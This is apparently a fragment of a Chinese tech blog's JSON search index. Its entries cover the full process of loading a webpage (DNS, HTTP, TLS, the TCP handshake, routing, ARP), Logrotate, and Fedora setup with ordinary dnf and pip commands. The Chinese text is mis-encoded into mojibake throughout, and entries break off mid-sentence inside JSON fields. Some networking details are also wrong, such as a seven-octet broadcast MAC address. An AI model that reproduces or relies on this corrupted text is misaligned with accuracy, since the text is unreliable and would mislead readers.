HTTPè¯·æ±‚æŠ¥æ–‡å¤„ç† è¯·æ±‚æ–¹æ³•URIåè®®/ç‰ˆæœ¬ è¯·æ±‚å¤´(Request Header) è¯·æ±‚æ­£æ–‡ ç½‘ç«™å†…éƒ¨æ•°æ®(å‘é€ã€æ¥æ”¶)æ•´ç†å“åº” HTTPå“åº”æŠ¥æ–‡å¤„ç† TCPå››æ¬¡æ–­å¼€ åº”ç”¨å±‚å¼€å§‹ 1.1. åœ¨æµè§ˆå™¨è¾“å…¥https://www.taobao.com 1.1.1. æµè§ˆå™¨æ¥æ”¶urlå¼€å¯ç½‘ç»œè¯·æ±‚çº¿ç¨‹,URLåŒ…æ‹¬ä»¥ä¸‹éƒ¨åˆ† protocolï¼šåè®®å¤´https hostï¼šä¸»æœºåŸŸåwww.taobao.com portï¼šç«¯å£å·(é»˜è®¤) pathï¼šæ—  queryï¼šæ—  fragmentï¼šæ—  1.1.2. httpsåè®® httpsåè®®æ˜¯åŸºäºhttpåè®®å¼€å‘çš„,æ˜¯æ¯”httpæ›´å®‰å…¨çš„åè®®,åœ¨httpåè®®çš„åŸºç¡€ä¸Šå¢åŠ äº†SSL/TLSåŠ å¯† 1.2. DNSè·å–IPåœ°å€ ä¸€èˆ¬ï¼Œå¦‚æœå¹³å°é…å¤‡äº†è´Ÿè½½å‡è¡¡çš„è¯ï¼Œå‰ä¸€æ­¥DNSè§£æè·å¾—çš„IPåœ°å€åº”è¯¥æ˜¯Nginxè´Ÿè½½å‡è¡¡æœåŠ¡å™¨çš„IPåœ°å€ã€‚æ‰€ä»¥ï¼Œä¹‹åä¼šå°†æˆ‘ä»¬çš„ç½‘é¡µè¯·æ±‚å‘é€åˆ°äº†Nginxè´Ÿè½½å‡è¡¡æœåŠ¡å™¨ä¸Šã€‚ Nginxæ ¹æ®æˆ‘ä»¬è®¾å®šçš„åˆ†é…ç®—æ³•å’Œè§„åˆ™ï¼Œé€‰æ‹©ä¸€å°åç«¯çš„çœŸå®WebæœåŠ¡å™¨ï¼Œä¸ä¹‹å»ºç«‹TCPè¿æ¥ã€å¹¶è½¬å‘æˆ‘ä»¬æµè§ˆå™¨å‘å‡ºå»çš„ç½‘é¡µè¯·æ±‚ã€‚ 1.2.1. å¯»æ‰¾IPåœ°å€è¿‡ç¨‹: è¯·æ±‚ä¸€æ—¦å‘èµ·ï¼Œæµè§ˆå™¨é¦–å…ˆè¦åšçš„äº‹æƒ…å°±æ˜¯è§£æè¿™ä¸ªåŸŸåï¼Œä¸€èˆ¬æ¥è¯´ï¼Œæµè§ˆå™¨ä¼šé¦–å…ˆæŸ¥çœ‹æœ¬åœ°ç¡¬ç›˜çš„ hosts æ–‡ä»¶ï¼Œçœ‹çœ‹å…¶ä¸­æœ‰æ²¡æœ‰å’Œè¿™ä¸ªåŸŸåå¯¹åº”çš„è§„åˆ™ï¼Œå¦‚æœæœ‰çš„è¯å°±ç›´æ¥ä½¿ç”¨ hosts æ–‡ä»¶é‡Œé¢çš„ ip åœ°å€ã€‚ å¦‚æœåœ¨æœ¬åœ°çš„ hosts æ–‡ä»¶æ²¡æœ‰èƒ½å¤Ÿæ‰¾åˆ°å¯¹åº”çš„ ip åœ°å€ï¼Œæµè§ˆå™¨ä¼šå‘å‡ºä¸€ä¸ª DNSè¯·æ±‚åˆ°æœ¬åœ°DNSæœåŠ¡å™¨ ã€‚æœ¬åœ°DNSæœåŠ¡å™¨ä¸€èˆ¬éƒ½æ˜¯ä½ çš„ç½‘ç»œæ¥å…¥æœåŠ¡å™¨å•†æä¾›ï¼Œæ¯”å¦‚ä¸­å›½ç”µä¿¡ï¼Œä¸­å›½ç§»åŠ¨ã€‚ æŸ¥è¯¢ä½ è¾“å…¥çš„ç½‘å€çš„DNSè¯·æ±‚åˆ°è¾¾æœ¬åœ°DNSæœåŠ¡å™¨ä¹‹åï¼Œæœ¬åœ°DNSæœåŠ¡å™¨ä¼šé¦–å…ˆæŸ¥è¯¢å®ƒçš„ç¼“å­˜è®°å½•ï¼Œå¦‚æœç¼“å­˜ä¸­æœ‰æ­¤æ¡è®°å½•ï¼Œå°±å¯ä»¥ç›´æ¥è¿”å›ç»“æœï¼Œæ­¤è¿‡ç¨‹æ˜¯é€’å½’çš„æ–¹å¼è¿›è¡ŒæŸ¥è¯¢ã€‚å¦‚æœæ²¡æœ‰ï¼Œæœ¬åœ°DNSæœåŠ¡å™¨è¿˜è¦å‘DNSæ ¹æœåŠ¡å™¨è¿›è¡ŒæŸ¥è¯¢ã€‚ DNSæ ¹æœåŠ¡å™¨æ²¡æœ‰è®°å½•å…·ä½“çš„åŸŸåå’ŒIPåœ°å€çš„å¯¹åº”å…³ç³»ï¼Œäºæ˜¯å‘Šè¯‰æœ¬åœ°DNSæœåŠ¡å™¨ï¼Œä½ å¯ä»¥åˆ°åŸŸæœåŠ¡å™¨ä¸Šå»ç»§ç»­æŸ¥è¯¢ï¼Œå¹¶ç»™å‡ºåŸŸæœåŠ¡å™¨çš„åœ°å€ã€‚è¿™ç§è¿‡ç¨‹æ˜¯è¿­ä»£çš„è¿‡ç¨‹ã€‚ æœ¬åœ°DNSæœåŠ¡å™¨ç»§ç»­å‘åŸŸæœåŠ¡å™¨å‘å‡ºè¯·æ±‚ï¼Œåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œè¯·æ±‚çš„å¯¹è±¡æ˜¯.comåŸŸæœåŠ¡å™¨ã€‚.comåŸŸæœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚ä¹‹åï¼Œä¹Ÿä¸ä¼šç›´æ¥è¿”å›åŸŸåå’ŒIPåœ°å€çš„å¯¹åº”å…³ç³»ï¼Œè€Œæ˜¯å‘Šè¯‰æœ¬åœ°DNSæœåŠ¡å™¨ï¼Œä½ çš„åŸŸåçš„è§£ææœåŠ¡å™¨çš„åœ°å€ã€‚ æœ€åï¼Œæœ¬åœ°DNSæœåŠ¡å™¨å‘åŸŸåçš„è§£ææœåŠ¡å™¨å‘å‡ºè¯·æ±‚ï¼Œè¿™æ—¶å°±èƒ½æ”¶åˆ°ä¸€ä¸ªåŸŸåå’ŒIPåœ°å€å¯¹åº”å…³ç³»ï¼Œæœ¬åœ°DNSæœåŠ¡å™¨ä¸ä»…è¦æŠŠIPåœ°å€è¿”å›ç»™ç”¨æˆ·ç”µè„‘ï¼Œè¿˜è¦æŠŠè¿™ä¸ªå¯¹åº”å…³ç³»ä¿å­˜åœ¨ç¼“å­˜ä¸­ï¼Œä»¥å¤‡ä¸‹æ¬¡åˆ«çš„ç”¨æˆ·æŸ¥è¯¢æ—¶ï¼Œå¯ä»¥ç›´æ¥è¿”å›ç»“æœï¼ŒåŠ å¿«ç½‘ç»œè®¿é—®ã€‚å¦‚æœurlé‡Œä¸åŒ…å«ç«¯å£å·ï¼Œåˆ™ä¼šä½¿ç”¨è¯¥åè®®çš„é»˜è®¤ç«¯å£å·ã€‚ 1.3. æ ¹æ®HTTPåè®®ç”ŸæˆHTTPè¯·æ±‚æŠ¥æ–‡ HTTPæŠ¥æ–‡ä¸€èˆ¬åŒ…æ‹¬äº†ï¼š è¯·æ±‚/å“åº”è¡Œï¼Œè¯·æ±‚/å“åº”å¤´éƒ¨ï¼Œç©ºç™½è¡Œï¼Œè¯·æ±‚ä½“/å“åº”æ•°æ®ã€‚ 1.3.1. è¯·æ±‚ ã€è¯· æ±‚ è¡Œã€‘è¯·æ±‚æ–¹æ³• ç©ºæ ¼ è¯·æ±‚èµ„æºåœ°å€(URIã€æ— åŸŸå) ç©ºæ ¼ HTTPç‰ˆæœ¬ ç©ºæ ¼ CRLF(æ¢è¡Œç¬¦) ã€è¯· æ±‚ å¤´ã€‘æ ‡è¯†: å†…å®¹ CRLF(æ¢è¡Œç¬¦) ã€ç©º ä¸€ è¡Œã€‘(è¡¨ç¤ºè¯·æ±‚å¤´ç»“æŸ) ã€è¯·æ±‚ ä¸»ä½“ã€‘ï¼ˆå³è¯·æ±‚æ­£æ–‡ï¼Œç”¨æˆ·çš„ä¸»è¦æ•°æ®ã€‚POSTæ–¹å¼æ—¶ä½¿ç”¨ï¼ŒGETæ— è¯·æ±‚ä¸»ä½“ï¼‰ 1.3.2. å“åº” ã€å“ åº” è¡Œã€‘HTTPç‰ˆæœ¬ ç©ºæ ¼ çŠ¶æ€ç  ç©ºæ ¼ çŠ¶æ€ç çš„æ–‡æœ¬æè¿° ç©ºæ ¼ CRLF(æ¢è¡Œç¬¦) ã€å“ åº” å¤´ã€‘æ ‡è¯†:å†…å®¹ CRLF(æ¢è¡Œç¬¦) ã€ç©º ä¸€ è¡Œã€‘(è¡¨ç¤ºå“åº”å¤´ç»“æŸ) ã€å“åº” ä¸»ä½“ã€‘æ‰€è°“å“åº”ä¸»ä½“ï¼Œå°±æ˜¯æœåŠ¡å™¨è¿”å›çš„èµ„æºçš„å†…å®¹ã€‚å³æ•´ä¸ªHTMLæ–‡ä»¶ã€‚ 1.4. TLSè¿›è¡ŒåŠ å¯†,æä¾›ä¿å¯†æ€§å’Œæ•°æ®å®Œæ•´æ€§ TLSæ˜¯å¯¹SSLçš„æ”¹è¿›,ç›®æ ‡æ˜¯ä¸ºäº†æ›´å®‰å…¨,å¯ä»¥ç¡®ä¿æ•°æ®å‘é€åˆ°æ­£ç¡®çš„å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨,é€”ä¸­é˜²æ­¢è¢«çªƒå–,å¹¶ä¸”æ•°æ®åœ¨è¿‡ç¨‹ä¸­ä¸å‘ç”Ÿæ”¹å˜. TLS ä½¿ç”¨â€œæ¶ˆæ¯è®¤è¯ä»£ç çš„å¯†é’¥æ•£åˆ—æ³•â€ï¼Œå½“è®°å½•åœ¨å¼€æ”¾çš„ç½‘ç»œï¼ˆå¦‚å› ç‰¹ç½‘ï¼‰ä¸Šä¼ é€æ—¶ï¼Œè¯¥ä»£ç ç¡®ä¿è®°å½•ä¸ä¼šè¢«å˜æ›´ã€‚ å¢å¼ºçš„ä¼ªéšæœºåŠŸèƒ½ï¼ˆPRFï¼‰ï¼šPRFç”Ÿæˆå¯†é’¥æ•°æ®ã€‚åœ¨TLSä¸­ï¼ŒPRFä½¿ç”¨ä¸¤ç§æ•£åˆ—ç®—æ³•ä¿è¯å…¶å®‰å…¨æ€§ã€‚å¦‚æœä»»ä¸€ç®—æ³•æš´éœ²äº†ï¼Œåªè¦ç¬¬äºŒç§ç®—æ³•æœªæš´éœ²ï¼Œæ•°æ®ä»ç„¶æ˜¯å®‰å…¨çš„ã€‚ TLSæä¾›æ›´å¤šçš„ç‰¹å®šå’Œé™„åŠ è­¦æŠ¥ï¼Œä»¥æŒ‡ç¤ºä»»ä¸€ä¼šè¯ç«¯ç‚¹æ£€æµ‹åˆ°çš„é—®é¢˜ã€‚ TLSåå•†è¿‡ç¨‹ å®¢æˆ·ç«¯å‘å‡ºè¯·æ±‚(ClientHello)ï¼Œå®¢æˆ·ç«¯è¡¨è¾¾æƒ³è·ŸæœåŠ¡ç«¯å®‰å…¨è¿›è¡Œé€šè¯ æœåŠ¡å™¨å›åº” (ServerHello)ï¼ŒæœåŠ¡å™¨æ”¶åˆ°å¹¶è¿”å›ç»™å®¢æˆ·ç«¯è¯ä¹¦,æ‹¿å»éªŒè¯èº«ä»½ å®¢æˆ·ç«¯å›åº”(Certificate Verify),å®¢æˆ·ç«¯éªŒè¯è¯ä¹¦çš„çœŸå®æ€§,å¦‚æœæœ‰è¯¯å‘å‡ºè­¦å‘Šå¹¶æ–­å¼€é“¾æ¥,å¦‚æœæ— è¯¯,å®¢æˆ·ç«¯å°±ä¼šå–å‡ºå…¬é’¥å¹¶æŠŠç§˜å¯†æ¶ˆæ¯åŠ å¯†å‘é€è‡³æœåŠ¡ç«¯ æœåŠ¡ç«¯æœ€åå›åº”(Server Finish),ç”¨ç§é’¥å°†å®¢æˆ·ç«¯æ¶ˆæ¯è§£å¯†,ç„¶åå¤„ç†å¹¶åŠ å¯†å‘ç»™å®¢æˆ·ç«¯,è¿™æ—¶åŠ å¯†é€šé“å·²ç»å»ºç«‹æˆåŠŸäº†.åŒæ–¹å¯ä»¥è¿›è¡ŒåŠ å¯†ä¼ è¾“äº†. åº”ç”¨å±‚ç»“æŸ åœ¨åº”ç”¨å±‚å°†è¦å‘é€çš„æ•°æ®å†…å®¹å½¢æˆäº†åº”ç”¨å±‚çš„æŠ¥æ–‡data,å‘é€åˆ°ä¼ è¾“å±‚ ä¼ è¾“å±‚å¼€å§‹ 1.5. TCPä¸‰æ¬¡æ¡æ‰‹ æ¡æ‰‹è¿‡ç¨‹: ç¬¬ä¸€æ¬¡æ¡æ‰‹ï¼šå®¢æˆ·ç«¯ç»™æœåŠ¡ç«¯å‘ä¸€ä¸ª SYN æŠ¥æ–‡ï¼Œå¹¶æŒ‡æ˜å®¢æˆ·ç«¯çš„åˆå§‹åŒ–åºåˆ—å· ISNÂ©ã€‚æ­¤æ—¶å®¢æˆ·ç«¯å¤„äº SYN_SendçŠ¶æ€ã€‚ ç¬¬äºŒæ¬¡æ¡æ‰‹ï¼šæœåŠ¡å™¨æ”¶åˆ°å®¢æˆ·ç«¯çš„ SYN æŠ¥æ–‡ä¹‹åï¼Œä¼šä»¥è‡ªå·±çš„ SYN æŠ¥æ–‡ä½œä¸ºåº”ç­”ï¼Œå¹¶ä¸”ä¹Ÿæ˜¯æŒ‡å®šäº†è‡ªå·±çš„åˆå§‹åŒ–åºåˆ—å· ISN(s)ï¼ŒåŒæ—¶ä¼šæŠŠå®¢æˆ·ç«¯çš„ ISN + 1 ä½œä¸º ACK çš„å€¼ï¼Œè¡¨ç¤ºè‡ªå·±å·²ç»æ”¶åˆ°äº†å®¢æˆ·ç«¯çš„ SYNï¼Œæ­¤æ—¶æœåŠ¡å™¨å¤„äº SYN_REVDçš„çŠ¶æ€ ç¬¬ä¸‰æ¬¡æ¡æ‰‹ï¼šå®¢æˆ·ç«¯æ”¶åˆ° SYN æŠ¥æ–‡ä¹‹åï¼Œä¼šå‘é€ä¸€ä¸ª ACK æŠ¥æ–‡ï¼Œå½“ç„¶ï¼Œä¹Ÿæ˜¯ä¸€æ ·æŠŠæœåŠ¡å™¨çš„ ISN + 1 ä½œä¸º ACK çš„å€¼ï¼Œè¡¨ç¤ºå·²ç»æ”¶åˆ°äº†æœåŠ¡ç«¯çš„ SYN æŠ¥æ–‡ï¼Œæ­¤æ—¶å®¢æˆ·ç«¯å¤„äº establisedçŠ¶æ€ã€‚ æœåŠ¡å™¨æ”¶åˆ° ACK æŠ¥æ–‡ä¹‹åï¼Œä¹Ÿå¤„äº establised çŠ¶æ€ï¼Œæ­¤æ—¶ï¼ŒåŒæ–¹ä»¥å»ºç«‹èµ·äº†é“¾æ¥ã€‚ é€šä¿—ç‚¹è¯´å°±æ˜¯: å®¢æˆ·ç«¯æƒ³è¦è·ŸæœåŠ¡ç«¯è¿›è¡Œé€šä¿¡,é¦–å…ˆå‘ŠçŸ¥æœåŠ¡ç«¯ä¸€å£°:â€œæˆ‘æƒ³è·Ÿä½ é€šä¿¡â€ æœåŠ¡ç«¯æ”¶åˆ°å®¢æˆ·ç«¯çš„è¿æ¥è¯·æ±‚,å›ä¸€ä¸ªç¡®è®¤æ¶ˆæ¯:â€œæˆ‘çŸ¥é“äº†,ä½ ç°åœ¨èƒ½è¿å—?â€ å®¢æˆ·ç«¯æ”¶åˆ°æœåŠ¡ç«¯çš„ç¡®è®¤æ¶ˆæ¯å,ç¤¼è²Œçš„å‘ŠçŸ¥ä¸€ä¸‹æœåŠ¡ç«¯:â€œå¥½çš„,å’±ä»¬å¼€å§‹é€šä¿¡å§â€ ä¼ è¾“å±‚ç»“æŸ è¿™äº›æ•°æ®é€šè¿‡ä¼ è¾“å±‚å‘é€ï¼Œæ¯”å¦‚tcpåè®®ã€‚æ‰€ä»¥å®ƒä»¬ä¼šè¢«é€åˆ°ä¼ è¾“å±‚å¤„ç†ï¼Œåœ¨è¿™é‡ŒæŠ¥æ–‡æ‰“ä¸Šäº†ä¼ è¾“å¤´çš„åŒ…å¤´ï¼Œä¸»è¦åŒ…å«ç«¯å£å·ï¼Œä»¥åŠtcpçš„å„ç§åˆ¶ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯æ˜¯ç›´æ¥å¾—åˆ°çš„ï¼Œå› ä¸ºæ¥å£ä¸­éœ€è¦æŒ‡å®šç«¯å£ã€‚è¿™æ ·å°±ç»„æˆäº†tcpçš„æ•°æ®ä¼ é€å•ä½segmentã€‚tcpæ˜¯ä¸€ç§ç«¯åˆ°ç«¯çš„åè®®ï¼Œåˆ©ç”¨è¿™äº›ä¿¡æ¯ï¼Œæ¯”å¦‚tcpé¦–éƒ¨ä¸­çš„åºå·ç¡®è®¤åºå·ï¼Œæ ¹æ®è¿™äº›æ•°å­—ï¼Œå‘é€çš„ä¸€æ–¹ä¸æ–­çš„è¿›è¡Œå‘é€ç­‰å¾…ç¡®è®¤ï¼Œå‘é€ä¸€ä¸ªæ•°æ®æ®µåï¼Œä¼šå¼€å¯ä¸€ä¸ªè®¡æ•°å™¨ï¼Œåªæœ‰å½“æ”¶åˆ°ç¡®è®¤åæ‰ä¼šå‘é€ä¸‹ä¸€ä¸ªï¼Œå¦‚æœè¶…è¿‡è®¡æ•°æ—¶é—´ä»æœªæ”¶åˆ°ç¡®è®¤åˆ™è¿›è¡Œé‡å‘ï¼Œåœ¨æ¥å—ç«¯å¦‚æœæ”¶åˆ°é”™è¯¯æ•°æ®ï¼Œåˆ™å°†å…¶ä¸¢å¼ƒï¼Œè¿™å°†å¯¼è‡´å‘é€ç«¯è¶…æ—¶é‡å‘ã€‚é€šè¿‡tcpåè®®ï¼Œæ§åˆ¶äº†æ•°æ®åŒ…çš„å‘é€åºåˆ—çš„äº§ç”Ÿï¼Œä¸æ–­çš„è°ƒæ•´å‘é€åºåˆ—ï¼Œå®ç°æµæ§å’Œæ•°æ®å®Œæ•´ã€‚ç„¶åå¾…å‘é€çš„æ•°æ®æ®µå‘é€åˆ°ç½‘ç»œå±‚ã€‚ ç½‘ç»œå±‚å¼€å§‹ 1.6. IPå¯»å€ ç½‘ç»œå±‚å¼€å§‹è´Ÿè´£å°†è¿™æ ·çš„æ•°æ®åŒ…åœ¨ç½‘ç»œä¸Šä¼ è¾“ï¼Œå¦‚ä½•ç©¿è¿‡è·¯ç”±å™¨ï¼Œæœ€ç»ˆåˆ°è¾¾ç›®çš„åœ°å€ã€‚åœ¨è¿™é‡Œï¼Œæ ¹æ®ç›®çš„ipåœ°å€ï¼Œå°±éœ€è¦æŸ¥æ‰¾ä¸‹ä¸€è·³è·¯ç”±çš„åœ°å€ã€‚é¦–å…ˆåœ¨æœ¬æœºï¼Œè¦æŸ¥æ‰¾æœ¬æœºçš„è·¯ç”±è¡¨ã€‚ æŸ¥æ‰¾è¿‡ç¨‹æ˜¯è¿™æ ·çš„: æ ¹æ®ç›®çš„åœ°å€ï¼Œå¾—åˆ°ç›®çš„ç½‘ç»œå·ï¼Œå¦‚æœå¤„åœ¨åŒä¸€ä¸ªå†…ç½‘ï¼Œåˆ™å¯ä»¥ç›´æ¥å‘é€ã€‚ å¦‚æœä¸æ˜¯ï¼Œåˆ™æŸ¥è¯¢è·¯ç”±è¡¨ï¼Œæ‰¾åˆ°ä¸€ä¸ªè·¯ç”±ã€‚ å¦‚æœæ‰¾ä¸åˆ°æ˜ç¡®çš„è·¯ç”±ï¼Œæ­¤æ—¶åœ¨è·¯ç”±è¡¨ä¸­è¿˜ä¼šæœ‰é»˜è®¤ç½‘å…³ï¼Œä¹Ÿå¯ç§°ä¸ºç¼ºçœç½‘å…³ï¼ŒIPç”¨ç¼ºçœçš„ç½‘å…³åœ°å€å°†ä¸€ä¸ªæ•°æ®ä¼ é€ç»™ä¸‹ä¸€ä¸ªæŒ‡å®šçš„è·¯ç”±å™¨ï¼Œæ‰€ä»¥ç½‘å…³ä¹Ÿå¯èƒ½æ˜¯è·¯ç”±å™¨ï¼Œä¹Ÿå¯èƒ½åªæ˜¯å†…ç½‘å‘ç‰¹å®šè·¯ç”±å™¨ä¼ è¾“æ•°æ®çš„ç½‘å…³ã€‚ è·¯ç”±å™¨æ”¶åˆ°æ•°æ®åï¼Œå®ƒå†æ¬¡ä¸ºè¿œç¨‹ä¸»æœºæˆ–ç½‘ç»œæŸ¥è¯¢è·¯ç”±ï¼Œè‹¥è¿˜æœªæ‰¾åˆ°è·¯ç”±ï¼Œè¯¥æ•°æ®åŒ…å°†å‘é€åˆ°è¯¥è·¯ç”±å™¨çš„ç¼ºçœç½‘å…³åœ°å€ã€‚è€Œæ•°æ®åŒ…ä¸­åŒ…å«ä¸€ä¸ªæœ€å¤§è·¯ç”±è·³æ•°ï¼Œå¦‚æœè¶…è¿‡è¿™ä¸ªè·³æ•°ï¼Œå°±ä¼šä¸¢å¼ƒæ•°æ®åŒ…ï¼Œè¿™æ ·å¯ä»¥é˜²æ­¢æ— é™ä¼ é€’ã€‚è·¯ç”±å™¨æ”¶åˆ°æ•°æ®åŒ…åï¼Œåªä¼šæŸ¥çœ‹ç½‘ç»œå±‚çš„åŒ…è£¹æ•°æ®ï¼Œç›®çš„ipã€‚æ‰€ä»¥è¯´å®ƒæ˜¯å·¥ä½œåœ¨ç½‘ç»œå±‚ï¼Œä¼ è¾“å±‚çš„æ•°æ®å¯¹å®ƒæ¥è¯´åˆ™æ˜¯é€æ˜çš„ã€‚ å¦‚æœä¸Šé¢è¿™äº›æ­¥éª¤éƒ½æ²¡æœ‰æˆåŠŸï¼Œé‚£ä¹ˆè¯¥æ•°æ®æŠ¥å°±ä¸èƒ½è¢«ä¼ é€ã€‚å¦‚æœä¸èƒ½ä¼ é€çš„æ•°æ®æŠ¥æ¥è‡ªæœ¬æœºï¼Œé‚£ä¹ˆä¸€èˆ¬ä¼šå‘ç”Ÿæˆæ•°æ®æŠ¥çš„åº”ç”¨ç¨‹åºè¿”å›ä¸€ä¸ªâ€œä¸»æœºä¸å¯è¾¾â€æˆ– â€œç½‘ç»œä¸å¯è¾¾â€çš„é”™è¯¯ã€‚ å…³äºNATè½¬æ¢ å¦‚æœæ˜¯åœ¨å±€åŸŸç½‘ä¸­,æ¯å°ç”µè„‘éƒ½æœ‰è‡ªå·±çš„ç§ç½‘IP,åœ¨å¯¹å¤–ä¼ è¾“çš„æ—¶å€™,ä¼šç»è¿‡NATè½¬æ¢,æ”¹æˆè·¯ç”±å™¨çš„å…¬ç½‘IP 1.7. ARPåè®®è·å–MACåœ°å€ ARPåè®®æ˜¯å°†IPåœ°å€æ˜ å°„æˆMACåœ°å€çš„,ç”±äºæ˜¯IPåè®®ä½¿ç”¨äº†ARPåè®®,å› æ­¤é€šå¸¸æŠŠARPåè®®åˆ’å½’ä¸ºç½‘ç»œå±‚,ä½†æ˜¯ARPåè®®çš„ç”¨é€”æ˜¯ä¸ºäº†ä»ç½‘ç»œå±‚ä½¿ç”¨çš„IPåœ°å€è§£æå‡ºåœ¨æ•°æ®é“¾è·¯å±‚ä½¿ç”¨çš„MACåœ°å€. è·å–MACåœ°å€è¿‡ç¨‹: ä¸»æœºç”Ÿæˆä¸€ä¸ªå…·æœ‰ç›®çš„IPåœ°å€(é»˜è®¤ç½‘å…³)çš„ARPæŸ¥è¯¢æŠ¥æ–‡,å°†è¯¥ARPæŠ¥æ–‡æ”¾ç½®åœ¨ä¸€ä¸ªå…·æœ‰å¹¿æ’­ç›®çš„åœ°å€(ä¾‹å¦‚FF:FF:FF:FF:FF:FF:FF)çš„ä»¥å¤ªç½‘å¸§ä¸­,å¹¶å‘äº¤æ¢æœºå‘é€è¯¥ä»¥å¤ªç½‘å¸§,äº¤æ¢æœºå°†è¯¥å¸§äº¤ä»˜ç»™æ‰€æœ‰è¿æ¥çš„è®¾å¤‡,åŒ…æ‹¬ç½‘å…³è·¯ç”±å™¨ã€‚ ç½‘å…³è·¯ç”±å™¨åœ¨æ¥å£ä¸Šæ”¶åˆ°åŒ…å«è¯¥ARPæŸ¥è¯¢æŠ¥æ–‡çš„å¸§,å‘ç°A","date":"2022-06-22","objectID":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/:0:0","tags":["linux"],"title":"è®¿é—®ä¸€ä¸ªç½‘é¡µçš„å…¨è¿‡ç¨‹","uri":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/"},{"categories":["linux","æ•´ç†æ”¶é›†"],"content":"æ—¥å¿—åˆ‡å‰²å·¥å…·Logrotateè¯¦è§£","date":"2022-06-22","objectID":"/posts/linux/%E6%97%A5%E5%BF%97%E5%88%87%E5%89%B2%E5%B7%A5%E5%85%B7logrotate%E8%AF%A6%E8%A7%A3/","tags":["linux","æ—¥å¿—"],"title":"æ—¥å¿—åˆ‡å‰²å·¥å…·Logrotateè¯¦è§£","uri":"/posts/linux/%E6%97%A5%E5%BF%97%E5%88%87%E5%89%B2%E5%B7%A5%E5%85%B7logrotate%E8%AF%A6%E8%A7%A3/"},{"categories":["linux","æ•´ç†æ”¶é›†"],"content":" Logrotate ç¨‹åºæ˜¯ä¸€ä¸ªæ—¥å¿—æ–‡ä»¶ç®¡ç†å·¥å…·ã€‚ç”¨äºåˆ†å‰²æ—¥å¿—æ–‡ä»¶ï¼Œå‹ç¼©è½¬å­˜ã€åˆ é™¤æ—§çš„æ—¥å¿—æ–‡ä»¶ï¼Œå¹¶åˆ›å»ºæ–°çš„æ—¥å¿—æ–‡ä»¶ https://cloud.tencent.com/developer/article/1681716 ","date":"2022-06-22","objectID":"/posts/linux/%E6%97%A5%E5%BF%97%E5%88%87%E5%89%B2%E5%B7%A5%E5%85%B7logrotate%E8%AF%A6%E8%A7%A3/:0:0","tags":["linux","æ—¥å¿—"],"title":"æ—¥å¿—åˆ‡å‰²å·¥å…·Logrotateè¯¦è§£","uri":"/posts/linux/%E6%97%A5%E5%BF%97%E5%88%87%E5%89%B2%E5%B7%A5%E5%85%B7logrotate%E8%AF%A6%E8%A7%A3/"},{"categories":["linux","é‚£äº›æœ‰ç”¨æ²¡ç”¨çš„"],"content":"Fedoraä¼˜åŒ–","date":"2022-02-28","objectID":"/posts/other/fedora%E4%BC%98%E5%8C%96/","tags":["linux","fedora"],"title":"Fedoraä¼˜åŒ–","uri":"/posts/other/fedora%E4%BC%98%E5%8C%96/"},{"categories":["linux","é‚£äº›æœ‰ç”¨æ²¡ç”¨çš„"],"content":" å‰è¨€ ä»¥ä¸‹çš„ä¸€äº›ä¼˜åŒ–åº”è¯¥æ˜¯æˆ‘è¿˜åœ¨ç”¨fedora26çš„æ—¶å€™è®°å½•çš„ï¼Œè™½ç„¶ç°åœ¨æˆ‘å·²ç»éƒ½æ›´æ–°åˆ°33äº†ï¼Œä¸è¿‡è¿™äº›ä¼˜åŒ–è¿˜æ˜¯æœ‰ç‚¹ç”¨çš„ï¼Œå¯ä»¥å‚è€ƒç€æ”¹, åç»­é‡åˆ°çš„é—®é¢˜æˆ‘ä¹Ÿåœ¨æ…¢æ…¢æ›´æ–°ä¸Šæ¥ã€‚ ç›®å‰å·²æ›´æ–°åˆ°fedora 38 2. å®‰è£…é¼ æ ‡å³é”®â€œåœ¨ç»ˆç«¯ä¸­æ‰“å¼€â€ï¼Œ33ä¸­é»˜è®¤å¥½åƒå·²ç»æœ‰äº† [root@cxd ~]$ sudo dnf install nautilus-open-terminal 3. å®‰è£… GNOME-tweak-tool $\u003e sudo dnf install gnome-tweak-tool ## æ‰©å±•åº“å®‰è£… ### Dash to dock (å¯é€‰:Dash to panel) ### system-monitor ### Recent(Item)s (fedora 38 å·²æ— ï¼Œæš‚ä¸ºæ‰¾åˆ°æ›¿ä»£æ–¹æ¡ˆ) ### Topicons plus git(fedora 38 å·²æ— ,åˆ‡æ¢ä¸º AppIndicator and KStatusNotifierItem Support) ### Drop down terminal(fedora 38 å·²æ— ) ### Clipboard indicator(å¯ä»¥åˆ‡æ¢ä¸º Clipboard History æˆ–è€… Pano ã€ æˆ–è€…ä½¿ç”¨ copyq (æ¨è) ) ### Todo.txt ### Bottompanel(å°†ä»»åŠ¡æ æ”¾åˆ°ä¸‹é¢,ä¸windows list å’Œ Dash to panel æ‰©å±•å†²çª) ## æ‰©å±•å­—ä½“ä¿®æ­£ # Drop down terminal: FONT_NAME_SETTING_KEY == monospace-font-name # org.gnome.desktop.interface # gsettings set org.gnome.desktop.interface monospace-font-name 'Source Code Pro 15' 4. å®‰è£…ä¸€äº›å¥½ç”¨çš„é¢å¤–å·¥å…·å’ŒåŒ… $\u003e sudo dnf install flameshot # ç«ç„°æˆªå›¾,å¾ˆå¥½ç”¨,æ‹¥æœ‰winä¸‹é¢æˆªå›¾è½¯ä»¶çš„ä¸€äº›åŠŸèƒ½ $\u003e sudo dnf install audacity # å£°éŸ³å¤„ç†å·¥å…·,å®é™…å¥½åƒæ²¡å•¥ç”¨ $\u003e sudo dnf install peek # gif å›¾åƒå½•åˆ¶å·¥å…· $\u003e sudo dnf install inkscape # çŸ¢é‡å›¾ç”»ç”»å·¥å…· $\u003e sudo dnf install sleek # todo ä»»åŠ¡(https://github.com/ransome1/sleek) $\u003e sudo dnf install libreoffice-langpack-zh-Hans.x86_64 # libreofficeçš„ä¸­æ–‡è¯­è¨€åŒ… $\u003e sudo pip3 install bpython # https://flathub.org/zh-Hans/apps/io.github.flattool.Warehouse # flatpak ç®¡ç†å·¥å…· # https://flathub.org/zh-Hans/apps/com.github.tchx84.Flatseal # flatpak 